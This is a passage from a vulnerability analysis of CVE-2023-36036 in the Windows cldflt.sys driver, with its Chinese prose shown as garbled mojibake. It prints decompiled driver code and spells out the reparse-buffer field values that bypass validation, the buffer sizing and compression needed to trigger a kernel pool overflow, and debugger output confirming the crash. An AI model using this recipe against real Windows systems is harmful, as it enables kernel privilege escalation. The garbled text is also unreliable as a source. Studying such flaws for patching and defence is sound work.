é‡Šæ”¾åŸå§‹æ•°æ®å†…å­˜ã€‚ 7. å…¶ä¸­åŒ…å«äº†è¯¦ç»†çš„é”™è¯¯å’Œæ—¥å¿—è®°å½•é€»è¾‘ã€‚ æ‰€ä»¥æ€»çš„æ¥è¯´,è¿™æ®µä»£ç ç”¨äºä»æ–‡ä»¶ç³»ç»Ÿè¯»å–Reparse Pointæ•°æ®,ç„¶åå¯¹æ•°æ®è¿›è¡Œè§£å‹å’Œè§£æ,æœ€åè¿”å›è§£æåçš„æ•°æ®ã€‚ ä¸»è¦åŠŸèƒ½èšç„¦åœ¨è¯»å–å‹ç¼©æ•°æ®å¹¶è§£å‹è¿™å—ã€‚ HsmpRpReadBufferç”± HsmpRpCommitNoLockå’Œ HsmpSetupContextsè°ƒç”¨ã€‚\nHsmpRpCommitNoLockè§£é‡Šå¦‚ä¸‹\nè¿™ä¸ªCå‡½æ•°å®ç°äº†HsmpRpCommitNoLock,å®ƒä¼¼ä¹æ˜¯ç”¨äºåœ¨æ²¡æœ‰é”çš„æƒ…å†µä¸‹æäº¤é¡µé¢é‡æ’­(Page Replay)æ•°æ®ã€‚ ä¸»è¦çš„é€»è¾‘å¦‚ä¸‹: 1. æ ¡éªŒå’Œå‡†å¤‡è¾“å…¥æ•°æ® 2. åˆ†é…å†…å­˜æ± æ¥å­˜å‚¨æäº¤çš„æ•°æ® 3. æ„å»ºæ•°æ®ç»“æ„,å¡«å……å„ç§å…ƒæ•°æ® 4. å°è¯•å‹ç¼©æ•°æ® 5. å°†æ•°æ®å†™å…¥æ–‡ä»¶ 6. æ¸…ç†ä¸´æ—¶æ•°æ®ç»“æ„å’Œå†…å­˜ å…·ä½“æ¥è¯´,è¿™ä¸ªå‡½æ•°åšäº†ä»¥ä¸‹å·¥ä½œ: 1. éªŒè¯è¾“å…¥å‚æ•°çš„æœ‰æ•ˆæ€§ 2. ä¸ºè¾“å‡ºç¼“å†²åŒºåˆ†é…å†…å­˜ 3. æ„å»ºè¾“å‡ºç¼“å†²åŒºçš„æ•°æ®ç»“æ„ 4. å¡«å……è¾“å‡ºç¼“å†²åŒºçš„å¤´éƒ¨ 5. å°†è¾“å…¥ç¼“å†²åŒºçš„æ•°æ®å¤åˆ¶åˆ°è¾“å‡ºç¼“å†²åŒº 6. è®¡ç®—æ ¡éªŒå’Œ 7. å°è¯•å‹ç¼©è¾“å‡ºç¼“å†²åŒº 8. æ ‡è®°æ–‡ä»¶å±æ€§ 9. å°†è¾“å‡ºç¼“å†²åŒºçš„æ•°æ®å†™å…¥æ–‡ä»¶ 10. é‡ç½®æ–‡ä»¶å±æ€§ 11. é‡Šæ”¾ä¸´æ—¶ç¼“å†²åŒºå’Œå†…å­˜ æ‰€ä»¥æ€»çš„æ¥è¯´,è¿™ä¸ªå‡½æ•°çš„ä¸»è¦ç›®çš„æ˜¯å‡†å¤‡å¹¶æäº¤é¡µé¢é‡æ’­æ•°æ®,åŒæ—¶å¤„ç†å¿…è¦çš„æ ¡éªŒã€å‹ç¼©å’Œæ¸…ç†å·¥ä½œã€‚ åœ¨ HsmpRpCommitNoLockä¸­æœ‰å¦‚ä¸‹ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°åœ¨å‰é¢diffä¸­å‡ºç°çš„0x4000å’Œ0x3FFCï¼Œå¯ä»¥çŒœæµ‹æ¼æ´äº§ç”Ÿäºè¯¥å‡½æ•°ä¸­\nLABEL_156: PoolWithTag = (unsigned int *)ExAllocatePoolWithTag(PagedPool, 0x4000ui64, 0x70527348u); v142 = PoolWithTag; v11 = (char *)PoolWithTag; if ( PoolWithTag ) { memset(PoolWithTag, 0, 0x4000ui64); v57 = InputBuffer; v58 = v11 + 4; if ( v8 \u0026amp;\u0026amp; *((_WORD *)v8 + 7) \u0026gt; 0xAu ) v57 = *((_WORD *)v8 + 7); v59 = (unsigned int *)(v58 + 8); *((_WORD *)v58 + 6) = 0; v9 = (unsigned __int64)(v58 + 16); *((_WORD *)v58 + 7) = v57; *((_DWORD *)v58 + 2) = 8 * v57 + 16; *(_DWORD *)v58 = \u0026#39;pReF\u0026#39;; memset(v58 + 16, 0, 8i64 * v57); if ( *((_WORD *)v58 + 7) ) { v60 = *v59; if ( ((v60 + 3) \u0026amp; 0xFFFFFFFFFFFFFFFCui64) + 1 \u0026lt;= 0x3FFC )// 12 åç§» { *v59 = (v60 + 3) \u0026amp; 0xFFFFFFFC; if ( *(_WORD *)v9 ) *((_WORD *)v58 + 6) |= 1u; *(_WORD *)v9 = 7; LODWORD(v9) = 0; *((_WORD *)v58 + 9) = 1; v61 = *v59; *((_DWORD *)v58 + 5) = v61; v58[v61] = 1; ç»§ç»­å®¡æŸ¥ä»£ç ï¼Œå‘ç°åœ¨HsmpRpCommitNoLockä¸­æœ‰å¦‚ä¸‹ä»£ç ï¼Œåœ¨do whileå¾ªç¯ä¸­è°ƒç”¨memmoveå‡½æ•°æ—¶ï¼Œä¼ å…¥çš„srcæ¥æºäº HsmpRpReadBufferè§£å‹åçš„element[10]æ•°æ®ï¼Œdstä¸ºExAllocatePoolWithTagåˆ†é…çš„å¤§å°ä¸º0x4000çš„å†…å­˜ã€‚é•¿åº¦å‚æ•°æ¥æºäºElementInfos[10].Lengthï¼Œä¸éš¾çœ‹å‡ºç”±æ­¤å¯ä»¥é€ æˆè¶Šç•Œå†™å…¥ï¼Œä¸”ç”¨æˆ·å¯æ§ã€‚\nv32 = 0i64; if ( (v9 \u0026amp; 0x80000000) == 0i64 ) { v8 = (char *)P + 12; ... { if ( (_DWORD)v54 \u0026amp;\u0026amp; (_WORD)v55 ) v167 = \u0026amp;v8[v54]; else v167 = v32; ..... PoolWithTag = (unsigned int *)ExAllocatePoolWithTag(PagedPool, 0x4000ui64, 0x70527348u); v142 = PoolWithTag; v11 = (char *)PoolWithTag; if ( PoolWithTag ) { memset(PoolWithTag, 0, 0x4000ui64); v57 = InputBuffer; v58 = v11 + 4; if ( v8 \u0026amp;\u0026amp; *((_WORD *)v8 + 7) \u0026gt; 0xAu ) v57 = *((_WORD *)v8 + 7); v59 = (unsigned int *)(v58 + 8); *((_WORD *)v58 + 6) = 0; v9 = (unsigned __int64)(v58 + 16); *((_WORD *)v58 + 7) = v57; *((_DWORD *)v58 + 2) = 8 * v57 + 16; *(_DWORD *)v58 = \u0026#39;pReF\u0026#39;; memset(v58 + 16, 0, 8i64 * v57); ..... } *v59 += v109; ..... if ( *((_WORD *)v58 + 28) ) *((_WORD *)v58 + 6) |= 1u; *v59 = (v113 + 3) \u0026amp; 0xFFFFFFFC; .... *v59 += v114; ..... v117 = (char *)v167; v107 = (char *)Src; *v59 = (v118 + 3) \u0026amp; 0xFFFFFFFC; *((_WORD *)v58 + 32) = 17; *((_WORD *)v58 + 33) = v119; v121 = *v59; *((_DWORD *)v58 + 17) = v121; if ( \u0026amp;v58[v121] != v117 ) { memmove(\u0026amp;v58[v121], v117, v120); ...... v125 = 10; do { v126 = v125; *(HSM_ELEMENT_INFO *)\u0026amp;v58[8 * v125 + 16] = v124-\u0026gt;ElementInfos[v125]; memmove(\u0026amp;v58[*v59], (char *)v124 + v124-\u0026gt;ElementInfos[v125].Offset, v124-\u0026gt;ElementInfos[v125].Length); ++v125; *(_DWORD *)\u0026amp;v58[8 * v126 + 20] = *v59; *v59 += *(unsigned __int16 *)\u0026amp;v58[8 * v126 + 18]; } while ( v125 \u0026lt; v124-\u0026gt;NumberOfElements ); ... if ( v14 ) ExFreePoolWithTag(v14, 0x70527348u); if ( v11 ) ExFreePoolWithTag(v11, 0x70527348u); return (unsigned int)v9; } æœç´¢Reparse point RtlCompressBufferï¼Œæ‰¾åˆ°æ–‡ç« ï¼Œæ ¹æ®\ræ–‡ç«  _REPARSE_DATA_BUFFERå®šä¹‰å¦‚ä¸‹ï¼Œå¯ä»¥çŸ¥é“ä¼ å…¥ HsmpRpiDecompressBufferçš„æ˜¯ REPARSE_DATA_BUFFERï¼Œå…¶ä¸­ ReparseTagä¸ºIO_REPARSE_TAG_CLOUD_3 å€¼ 0x9000301A å¹¶ä¸”åœ¨ç»“æ„ä½“ HsmReparseBufferRawçš„RawDataæˆå‘˜ä¸­å­˜å‚¨äº†ç”± (RtlCompressBufferå‹ç¼©çš„æ•°æ® HsmReparseBufferRaw\n// Handled by cldflt.sys!HsmpRpReadBuffer struct { USHORT Flags; // Flags (0x8000 = not compressed) USHORT Length; // Length of the data (uncompressed) BYTE RawData[1]; // To be RtlDecompressBuffer-ed } HsmReparseBufferRaw; _REPARSE_DATA_BUFFERå®šä¹‰\ntypedef struct _REPARSE_DATA_BUFFER { ULONG ReparseTag; // Reparse tag type USHORT ReparseDataLength; // Length of the reparse data USHORT Reserved; // Used internally by NTFS to store remaining length union { // Structure for IO_REPARSE_TAG_SYMLINK // Handled by nt!IoCompleteRequest struct { USHORT SubstituteNameOffset; USHORT SubstituteNameLength; USHORT PrintNameOffset; USHORT PrintNameLength; ULONG Flags; WCHAR PathBuffer[1]; /* Example of distinction between substitute and print names: // mklink /d ldrive c:\\ // SubstituteName: c:\\\\??\\ // PrintName: c:\\ */ } SymbolicLinkReparseBuffer; // Structure for IO_REPARSE_TAG_MOUNT_POINT // Handled by nt!IoCompleteRequest struct { USHORT SubstituteNameOffset; USHORT SubstituteNameLength; USHORT PrintNameOffset; USHORT PrintNameLength; WCHAR PathBuffer[1]; } MountPointReparseBuffer; // Structure for IO_REPARSE_TAG_WIM // Handled by wimmount!FPOpenReparseTarget-\u0026gt;wimserv.dll // (wimsrv!ImageExtract) struct { GUID ImageGuid; // GUID of the mounted VIM image BYTE ImagePathHash[0x14]; // Hash of the path to the file within the // image } WimImageReparseBuffer; // Structure for IO_REPARSE_TAG_WOF // Handled by FSCTL_GET_EXTERNAL_BACKING, FSCTL_SET_EXTERNAL_BACKING in // NTFS (Windows 10+) struct { //-- WOF_EXTERNAL_INFO -------------------- ULONG Wof_Version; // Should be 1 (WOF_CURRENT_VERSION) ULONG Wof_Provider; // Should be 2 (WOF_PROVIDER_FILE) //-- FILE_PROVIDER_EXTERNAL_INFO_V1 -------------------- ULONG FileInfo_Version; // Should be 1 (FILE_PROVIDER_CURRENT_VERSION) ULONG FileInfo_Algorithm; // Usually 0 (FILE_PROVIDER_COMPRESSION_XPRESS4K) } WofReparseBuffer; // Structure for IO_REPARSE_TAG_APPEXECLINK struct { ULONG StringCount; // Number of the strings in the StringList, separated // by \u0026#39;\\0\u0026#39; WCHAR StringList[1]; // Multistring (strings separated by \u0026#39;\\0\u0026#39;, // terminated by \u0026#39;\\0\\0\u0026#39;) } AppExecLinkReparseBuffer; // Structure for IO_REPARSE_TAG_WCI (0x80000018) struct { ULONG Version; // Expected to be 1 by wcifs.sys ULONG Reserved; GUID LookupGuid; // GUID used for lookup in wcifs!WcLookupLayer USHORT WciNameLength; // Length of the WCI subname, in bytes WCHAR WciName[1]; // The WCI subname (not zero terminated) } WcifsReparseBuffer; // Handled by cldflt.sys!HsmpRpReadBuffer struct { USHORT Flags; // Flags (0x8000 = not compressed) USHORT Length; // Length of the data (uncompressed) BYTE RawData[1]; // To be RtlDecompressBuffer-ed } HsmReparseBufferRaw; // Dummy structure struct { UCHAR DataBuffer[1]; } GenericReparseBuffer; } DUMMYUNIONNAME; } REPARSE_DATA_BUFFER, *PREPARSE_DATA_BUFFER; åœ¨\rè¿™ä¸ªGithubä»“åº“ä¸­å®ç°äº†å¯¹Reparse pointçš„è§£æï¼Œå…¶ä¸­å®šä¹‰äº†HSM_REPARSE_DATA\ntypedef struct _HSM_ELEMENT_INFO { USHORT Type; // Type of the element (?). One of HSM_ELEMENT_TYPE_XXX USHORT Length; // Length of the element data in bytes ULONG Offset; // Offset of the element data, relative to begin of HSM_DATA. Aligned to 4 bytes } HSM_ELEMENT_INFO, *PHSM_ELEMENT_INFO; typedef struct _HSM_DATA { ULONG Magic; // 0x70527442 (\u0026#39;pRtB\u0026#39;) for bitmap data, 0x70526546 (\u0026#39;FeRp\u0026#39;) for file data ULONG Crc32; // CRC32 of the following data (calculated by RtlComputeCrc32) ULONG Length; // Length of the entire HSM_DATA in bytes USHORT Flags; // HSM_DATA_XXXX USHORT NumberOfElements; // Number of elements HSM_ELEMENT_INFO ElementInfos[1]; // Array of element infos. There is fixed maximal items for bitmap and reparse data } HSM_DATA, *PHSM_DATA; typedef struct _HSM_REPARSE_DATA { USHORT Flags; // Lower 8 bits is revision (must be 1 as of Windows 10 16299) // Flags: 0x8000 = Data needs to be decompressed by RtlCompressBuffer USHORT Length; // Length of the HSM_REPARSE_DATA structure (including \u0026#34;Flags\u0026#34; and \u0026#34;Length\u0026#34;) HSM_DATA FileData; // HSM data } HSM_REPARSE_DATA, *PHSM_REPARSE_DATA; å¯¹åº”åœ¨ REPARSE_DATA_BUFFERçš„åç§»å¦‚ä¸‹\n0:000\u0026gt; dt pa Local var @ 0xa8444fec08 Type _REPARSE_DATA_BUFFER* 0x000001e0`ef867690 +0x000 ReparseTag : 0x9000301a +0x004 ReparseDataLength : 0x4008 +0x006 Reserved : 0 +0x008 SymbolicLinkReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-SymbolicLinkReparseBuffer\u0026gt; +0x008 MountPointReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-MountPointReparseBuffer\u0026gt; +0x008 WimImageReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-WimImageReparseBuffer\u0026gt; +0x008 WofReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-WofReparseBuffer\u0026gt; +0x008 AppExecLinkReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-AppExecLinkReparseBuffer\u0026gt; +0x008 WcifsReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-WcifsReparseBuffer\u0026gt; +0x008 hsm_reparse_data : _HSM_REPARSE_DATA +0x008 GenericReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-GenericReparseBuffer\u0026gt; 0:000\u0026gt; dx -r1 (*((poc3!_HSM_REPARSE_DATA *)0x1e0ef867698)) (*((poc3!_HSM_REPARSE_DATA *)0x1e0ef867698)) [Type: _HSM_REPARSE_DATA] [+0x000] Flags : 0x8001 [Type: unsigned short] // 8 [+0x002] Length : 0x4008 [Type: unsigned short] // 10 [+0x004] FileData [Type: _HSM_DATA] // 12 0:000\u0026gt; dx -r1 (*((poc3!_HSM_DATA *)0x1e0ef86769c)) (*((poc3!_HSM_DATA *)0x1e0ef86769c)) [Type: _HSM_DATA] [+0x000] Magic : 0x70526546 [Type: unsigned long] // 12 [+0x004] Crc32 : 0x31e13b17 [Type: unsigned long] // 16 [+0x008] Length : 0x4004 [Type: unsigned long] // 20 [+0x00c] Flags : 0x2 [Type: unsigned short] // 24 [+0x00e] NumberOfElements : 0xb [Type: unsigned short] // 26 [+0x010] ElementInfos [Type: _HSM_ELEMENT_INFO [10) // 28 PoCæ„é€ \nå°†ç»“æ„ä½“å¯¼å…¥åˆ°idaä¸­ï¼Œåœ¨HsmpRpCommitNoLockä¸­é¦–å…ˆå¯¹ReparseTagè¿›è¡ŒéªŒè¯ï¼Œè€Œåå°†hsm_reparse_dataå’Œå¯¹åº”çš„é•¿åº¦å¯¼å…¥åˆ° HsmpRpValidateBufferå‡½æ•°ä¸­éªŒè¯ã€‚\nif ( (reparse_data_buffer-\u0026gt;ReparseTag \u0026amp; 0xFFFF0FFF) != dword_1C00235D0 ) { LODWORD(v9) = -1073688821; HsmDbgBreakOnStatus(3221278475i64); if ( WPP_GLOBAL_Control != (PDEVICE_OBJECT)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (HIDWORD(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026amp; 1) != 0 \u0026amp;\u0026amp; BYTE1(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026gt;= 2u ) { WPP_SF_qiqDDd( WPP_GLOBAL_Control-\u0026gt;AttachedDevice, 2i64, v30, a2, *(_QWORD *)(v5 + 32), v29, dword_1C00235D0, reparse_data_buffer-\u0026gt;ReparseTag); } goto LABEL_8; } ReparseDataLength = reparse_data_buffer-\u0026gt;ReparseDataLength; v9 = (unsigned int)HsmpRpValidateBuffer(\u0026amp;reparse_data_buffer-\u0026gt;DUMMYUNIONNAME.hsm_reparse_data, ReparseDataLength); åœ¨ HsmpRpValidateBufferå‡½æ•°ä¸­å¯¹HSM_DATAç»“æ„ä½“çš„ä¸€äº›å­—æ®µåšäº†å¦‚ä¸‹æ ¡éªŒã€‚\nreparse_data_buffer-\u0026gt;ReparseDataLength \u0026gt; 4 reparse_data_buffer-\u0026gt;hsm_reparse_data.Flags=1 reparse_data_buffer-\u0026gt;hsm_reparse_data.FileData.Magic = \u0026lsquo;pReF\u0026rsquo; reparse_data_buffer-\u0026gt;hsm_reparse_data.FileData.Flags = 2, å¹¶ä¸”reparse_data_buffer-\u0026gt;hsm_reparse_data.FileData.Crc32 == RtlComputeCrc32(0, (PUCHAR)\u0026amp;a1-\u0026gt;FileData.Length, v2 - 8 NumberOfElements ä¸ä¸º0ï¼Œä¸”æœ€å¤§ä¸º10ï¼Œæœ€åä¸€ä¸ªä»¥NONEç»“å°¾ ç‰¹åˆ«çš„ï¼Œä»å¦‚ä¸‹ä»£ç ä¸­å¯ä»¥çœ‹åˆ°å¯¹ElementInfos[0]å’ŒElementInfos[1]è¿›è¡Œäº†æ ¡éªŒï¼Œå®¹æ˜“å¾—å‡ºå¦‚ä¸‹æ¡ä»¶ï¼š\nNumberOfElements \u0026gt; 1 FileData.Length \u0026gt;= 0x20 `FileData.ElementInfos[1].Type == 0xA FileData.ElementInfos[1].Offset \u0026gt;= 8 * NumberOfElements + 16 \u0026amp;\u0026amp; FileData.ElementInfos[1].Offset \u0026lt; FileData.Length FileData.ElementInfos[1].Length == 4 FileData.ElementInfos[1].Length + FileData.ElementInfos[1].Offset \u0026lt; 65535 if ( (unsigned __int16)NumberOfElements \u0026gt; 1u \u0026amp;\u0026amp; (unsigned int)Length \u0026gt;= 0x20 \u0026amp;\u0026amp; (v22 = a1-\u0026gt;FileData.ElementInfos[1].Type, v22 \u0026lt; 0x12u) \u0026amp;\u0026amp; ((v23 = a1-\u0026gt;FileData.ElementInfos[1].Offset, !(_DWORD)v23) || v23 \u0026gt;= hsm_data_length) \u0026amp;\u0026amp; (unsigned int)v23 \u0026lt;= (unsigned int)Length \u0026amp;\u0026amp; (v24 = a1-\u0026gt;FileData.ElementInfos[1].Length, v24 \u0026lt;= (unsigned int)Length) \u0026amp;\u0026amp; v24 + (unsigned int)v23 \u0026gt;= (unsigned int)v23 \u0026amp;\u0026amp; v24 + (unsigned int)v23 \u0026lt;= (unsigned int)Length \u0026amp;\u0026amp; v22 == 10 \u0026amp;\u0026amp; v24 == 4 ) { v5 = *(ULONG *)((char *)\u0026amp;p_FileData-\u0026gt;Magic + v23); IsReparseBufferSupported = 0; } else { IsReparseBufferSupported = 0xC0000225; } å¦‚ä¸‹ä»£ç å¯¹ElementInfos[2]è¿›è¡Œäº†æ ¡éªŒï¼Œæœ‰å¦‚ä¸‹ï¼š\nFileData.ElementInfos[2].Offset \u0026lt; FileData.Length FileData.ElementInfos[2].Length \u0026lt; FileData.Length FileData.ElementInfos[2].Type == 6 if ( (element_1_Data \u0026amp; 0x10) != 0 ) return IsReparseBufferSupported; v27 = a1-\u0026gt;FileData.Length; if ( v27 \u0026lt; 0x18 || (v28 = a1-\u0026gt;FileData.NumberOfElements, (unsigned __int16)v28 \u0026lt;= 2u) || v27 \u0026lt; 0x28 || (v29 = a1-\u0026gt;FileData.ElementInfos[2].Type, v29 \u0026gt;= 0x12u) || (v30 = a1-\u0026gt;FileData.ElementInfos[2].Offset, (_DWORD)v30) \u0026amp;\u0026amp; v30 \u0026lt; 8 * v28 + 16 || (unsigned int)v30 \u0026gt; v27 || (v31 = a1-\u0026gt;FileData.ElementInfos[2].Length, v31 \u0026gt; v27) || v31 + (unsigned int)v30 \u0026lt; (unsigned int)v30 || v31 + (unsigned int)v30 \u0026gt; v27 || v29 != 6 || (IsReparseBufferSupported = 0, v31 != 8) ) { IsReparseBufferSupported = 0xC0000225; } åé¢è¿˜æœ‰ä¸€å †æ ¡éªŒé€»è¾‘å°±ä¸è´´äº†ã€‚\nåœ¨ HsmpRpCommitNoLockä¸­å¯¹ HsmpRpValidateBufferè¿”å›å€¼åšäº†æ ¡éªŒï¼Œå¦‚æœIsReparseBufferSupportedä¸ä¸º0åˆ™ä¼šè¿›å…¥æŠ¥é”™é€»è¾‘ï¼Œè€Œåœ¨ HsmpRpValidateBuffer\nIsReparseBufferSupported = (unsigned int)HsmpRpValidateBuffer( \u0026amp;reparse_data_buffer-\u0026gt;DUMMYUNIONNAME.hsm_reparse_data, ReparseDataLength); HsmDbgBreakOnStatus(IsReparseBufferSupported); v32 = 0i64; if ( (IsReparseBufferSupported \u0026amp; 0x80000000) == 0i64 ) { ... } else { HsmDbgBreakOnCorruption(); if ( a4 == (_BYTE)v32 ) { if ( WPP_GLOBAL_Control != (PDEVICE_OBJECT)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (HIDWORD(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026amp; 1) != 0 åœ¨HsmpRpValidateBufferä¸­å¯ä»¥çœ‹åˆ°å½“é€šè¿‡ç¬¬ä¸€æ¬¡æ ¡éªŒåï¼Œå¦‚æœElementInfos[1]çš„Data \u0026amp; 0x10 åˆ™ä¼šç›´æ¥è¿”å›ï¼Œæ­¤æ—¶IsReparseBufferSupported=0èƒ½é€šè¿‡æ ¡éªŒã€‚\nif ( (unsigned __int16)NumberOfElements \u0026gt; 1u \u0026amp;\u0026amp; (unsigned int)Length \u0026gt;= 0x20 \u0026amp;\u0026amp; (v22 = a1-\u0026gt;FileData.ElementInfos[1].Type, v22 \u0026lt; 0x12u) \u0026amp;\u0026amp; ((v23 = a1-\u0026gt;FileData.ElementInfos[1].Offset, !(_DWORD)v23) || v23 \u0026gt;= hsm_data_length) \u0026amp;\u0026amp; (unsigned int)v23 \u0026lt;= (unsigned int)Length \u0026amp;\u0026amp; (v24 = a1-\u0026gt;FileData.ElementInfos[1].Length, v24 \u0026lt;= (unsigned int)Length) \u0026amp;\u0026amp; v24 + (unsigned int)v23 \u0026gt;= (unsigned int)v23 \u0026amp;\u0026amp; v24 + (unsigned int)v23 \u0026lt;= (unsigned int)Length \u0026amp;\u0026amp; v22 == 10 \u0026amp;\u0026amp; v24 == 4 ) { element_1_Data = *(ULONG *)((char *)\u0026amp;p_FileData-\u0026gt;Magic + v23); IsReparseBufferSupported = 0; } else { IsReparseBufferSupported = 0xC0000225; } HsmDbgBreakOnStatus(IsReparseBufferSupported); if ( (IsReparseBufferSupported \u0026amp; 0x80000000) != 0 ) { v25 = WPP_GLOBAL_Control; if ( WPP_GLOBAL_Control == (PDEVICE_OBJECT)\u0026amp;WPP_GLOBAL_Control || (HIDWORD(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026amp; 1) == 0 || BYTE1(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026lt; 2u ) { return IsReparseBufferSupported; } v26 = 24i64; goto LABEL_163; } if ( (element_1_Data \u0026amp; 0x10) != 0 ) return IsReparseBufferSupported; é€šè¿‡æ„é€ ElementInfos[0]å’ŒElementInfos[1]å¯ä»¥é€šè¿‡HsmpRpValidateBufferæ ¡éªŒï¼Œè€Œåæ¼æ´è§¦å‘ç‚¹ä¼šè¯»å–ElementInfos[10]çš„æ•°æ®å’ŒLengthé€šè¿‡memcpyè¿›è¡Œæ‹·è´ï¼Œæ‰€ä»¥è¿˜éœ€è¦æ„é€ ElementInfos[10]çš„æ•°æ®ï¼Œå¹¶ä¸”ElementInfos[10]çš„Lengthéœ€è¦è¶…è¿‡ç›®æ ‡ç¼“å†²åŒºï¼Œç‰¹åˆ«çš„åœ¨è®¡ç®—CRC32åï¼Œéœ€è¦é€šè¿‡RtlCompressBufferå‹ç¼©ç›®æ ‡æ•°æ®ï¼Œå¹¶æ”¾å…¥åˆ°FileDataå¤„ã€‚\næ„é€ å¤šå¤§çš„ç¼“å†²åŒºï¼Ÿæ ¹æ®å‰é¢è¡¥ä¸åˆ†æï¼Œåœ¨è¡¥ä¸ä¸­é™åˆ¶äº†ReparseDataLength \u0026lt; 0x4000ï¼Œæ‰€ä»¥è¶…è¿‡å››åƒçš„éƒ¨åˆ†ä¼šé€ æˆæº¢å‡ºï¼Œå¦‚æœæƒ³æº¢å‡º8ä¸ªå­—èŠ‚åˆ™éœ€è¦æ„é€ 0x4008 + 8 = 0x4010ï¼Œä¾æ­¤ç±»æ¨ï¼Œåœ¨æ„é€ ç¼“å†²åŒºæ—¶ã€‚\nå¦‚ä½•å°†æ„é€ å¥½çš„æ•°æ®ä¼ é€’ç»™é©±åŠ¨å¹¶åœ¨ç›®æ ‡ä½ç½®è§¦å‘å‘¢ï¼Ÿåœ¨ç½‘ä¸ŠæŸ¥åˆ°æœ‰ç±»ä¼¼æ¼æ´åˆ†ææ–‡ç« \rWindowsäº‘æ–‡ä»¶è¿·ä½ è¿‡æ»¤å™¨é©±åŠ¨ç¨‹åºä¸­çš„ææƒæ¼æ´(CVE-2021-31969)ï¼Œä¸éš¾çœ‹å‡ºCVE-2021-31969ä¿®å¤å’Œæœ¬æ¬¡åˆ†æçš„æ¼æ´CVE-2023-36036ä¿®å¤ä½ç½®ç±»ä¼¼ï¼Œéƒ½å¯¹ReparseDataLengthè¿›è¡Œäº†åˆ¤æ–­ï¼Œæ‰€ä»¥æœ¬æ¬¡PoCç¼–å†™ä¹Ÿå¯ä»¥å€Ÿé‰´ã€‚\nåœ¨CVE-2021-31969åˆ†ææ–‡ç« ä¸­è´´å‡ºäº†éƒ¨åˆ†PoCï¼Œç»“åˆè¿™éƒ¨åˆ†PoCå’Œå‰é¢çš„ç»“æ„ä½“ï¼Œå†™å‡ºPoCä¹Ÿå°±ä¸éš¾äº†ã€‚\nåŠ¨æ€è°ƒè¯•\nåœ¨å¦‚ä¸‹ä¸¤ä¸ªä½ç½®ä¸‹æ–­ç‚¹\nbp cldflt!HsmpRpCommitNoLock bp cldflt!HsmpRpCommitNoLock+0x13de è¿è¡Œpocï¼Œå¯ä»¥çœ‹åˆ°å·²ç»è¿›å…¥HsmpRpCommitNoLockå‡½æ•°\n1: kd\u0026gt; g Breakpoint 0 hit cldflt!HsmpRpCommitNoLock: fffff804`6f6a1e88 48895c2420 mov qword ptr [rsp+20h],rbx ç»§ç»­è¿è¡Œï¼Œè§¦å‘ç¬¬äºŒä¸ªæ–­ç‚¹\n0: kd\u0026gt; g Breakpoint 1 hit cldflt!HsmpRpCommitNoLock+0x13de: fffff804`6f6a3266 e81571faff call cldflt!memcpy (fffff804`6f64a380) æ­¤æ—¶memmoveå·²ç»è¢«ä¼˜åŒ–ä¸ºmemcpyï¼Œè€Œè¦æ‹·è´çš„é•¿åº¦ä¸º0x3f94ï¼Œdstæ‰€åœ¨çš„å †å¤§å°ä¸º0x4000ï¼ŒdstæŒ‡å‘åç§»0x74å¤„ï¼Œæœ€å¤šæœ‰0x3f8cå¤§å°ï¼Œæ‰€ä»¥memcpyæ‹·è´æ—¶ä¼šè¶Šç•Œå†™å…¥8ä¸ªå­—èŠ‚ï¼Œé€ æˆå †æº¢å‡ºã€‚\n1: kd\u0026gt; rr8 r8=0000000000003f94 1: kd\u0026gt; !pool rcx Pool page ffffd980717f7074 region is Paged pool *ffffd980717f7000 : large page allocation, tag is HsRp, size is 0x4000 bytes Owning component : Unknown (update pooltag.txt) ç»§ç»­è¿è¡Œï¼Œåˆ™åœ¨memcpyå†…éƒ¨è§¦å‘å¼‚å¸¸ï¼Œå› ä¸ºå°è¯•å¾€æœªåˆ†é…çš„å†…å­˜é‡Œé¢å†™å…¥00\n0: kd\u0026gt; u cldflt!memcpy+0x165: fffff800`8186a4e5 0f2941f0 movaps xmmword ptr [rcx-10h],xmm0 0: kd\u0026gt; !pool rcx - 0x10 Pool page ffffe5028e4fa000 region is Paged pool ffffe5028e4fa000 is not a valid large pool allocation, checking large session pool... ffffe5028e4fa000 is not valid pool. Checking for freed (or corrupt) pool Address ffffe5028e4fa000 could not be read. It may be a freed, invalid or paged out page 0: kd\u0026gt; rxmm0 mm0=0000000000000000 å¯¹åº”ä»£ç ä¸º\nif ( v25 ) *(_OWORD *)(v15 + v25 - 16) = *(_OWORD *)(v15 + v25 - 16 + v13); *(__m128 *)(v15 - 0x10) = v14; ä»¥ä¸‹ä¸ºè°ƒç”¨æ ˆ\n1: kd\u0026gt; k # Child-SP RetAddr Call Site 00 fffffb8a`8a45e4f8 fffff804`63717f82 nt!DbgBreakPointWithStatus 01 fffffb8a`8a45e500 fffff804`63717566 nt!KiBugCheckDebugBreak+0x12 02 fffffb8a`8a45e560 fffff804`635fd747 nt!KeBugCheck2+0x946 03 fffffb8a`8a45ec70 fffff804`63638f6f nt!KeBugCheckEx+0x107 04 fffffb8a`8a45ecb0 fffff804`63430730 nt!MiSystemFault+0x1de5ff 05 fffffb8a`8a45edb0 fffff804`6360d1d8 nt!MmAccessFault+0x400 06 fffffb8a`8a45ef50 fffff804`6f64a4e1 nt!KiPageFault+0x358 07 fffffb8a`8a45f0e8 fffff804`6f6a326b cldflt!memcpy+0x161 08 fffffb8a`8a45f0f0 